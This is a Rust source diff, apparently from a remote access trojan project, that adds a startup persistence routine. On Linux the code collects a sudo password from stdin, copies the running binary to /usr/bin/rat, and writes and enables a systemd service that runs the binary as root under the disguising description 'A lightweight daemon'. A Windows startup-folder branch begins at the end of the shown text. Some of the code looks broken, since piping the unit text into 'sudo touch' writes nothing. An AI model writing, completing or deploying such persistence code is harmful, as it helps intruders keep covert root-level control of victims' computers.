@@ -1,17 +1,64 @@
-use std::path::PathBuf;
+use std::{io::Write, path::PathBuf, process::Stdio};
 
+#[allow(unused)]
 pub fn startup() {
     if cfg!(target_os = "linux") {
+        // grabbing the path of the current running executable
         let current_exe_path = std::env::current_exe().unwrap();
+
+        // copying the executable to the /usr/bin directory
+        let password = loop {
+            let mut child = std::process::Command::new("sudo")
+                .arg("-S")
+                .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
+                .stdin(Stdio::piped())
+                .spawn()
+                .unwrap();
+
+            let mut s = String::new();
+            std::io::stdin().read_line(&mut s).unwrap();
+            let _ = child.stdin.as_mut().unwrap().write_all(&s.as_bytes());
+
+            match child.wait_with_output() {
+                Ok(op) => {
+                    break s;
+                }
+                Err(e) => {
+                    continue;
+                }
+            }
+        };
+
+        let service = "
+[Unit]
+Description=A lightweight daemon
+After=network.target
+
+[Service]
+User=root
+Group=root
+ExecStart=/usr/bin/rat
+WorkingDirectory=/var/rat/
+
+[Install]
+WantedBy=multi-user.target
+        ";
+
+        // creating service file
+        let mut child = std::process::Command::new("sudo")
+            .args(["touch", "/etc/systemd/system/ratd.service"])
+            .stdin(Stdio::piped())
+            .spawn()
+            .unwrap();
+
+        child.stdin.as_mut().unwrap().write_all(&service.as_bytes());
+        child.wait_with_output();
+
+        // enabling service file on startup
         let _ = std::process::Command::new("sudo")
-            .args(["cp", current_exe_path.to_str().unwrap(), "/usr/bin/rat"])
-            .output();
-        // create rat.service directly in /etc/systemd/system/multi-user.target
-        // start and enable rat.service
-        if let Ok(_) = std::process::Command::new("sudo")
-            .args(["cp", "rat.service", "/etc/systemd/system/multi-user.target"])
+            .args(["systemctl", "enable", "ratd.service"])
             .output()
-        {}
+            .unwrap();
     } else if cfg!(target_os = "windows") {
         let mut user_startup_dir = PathBuf::with_capacity(96);
         user_startup_dir.push(std::env::var("USERPROFILE").unwrap());
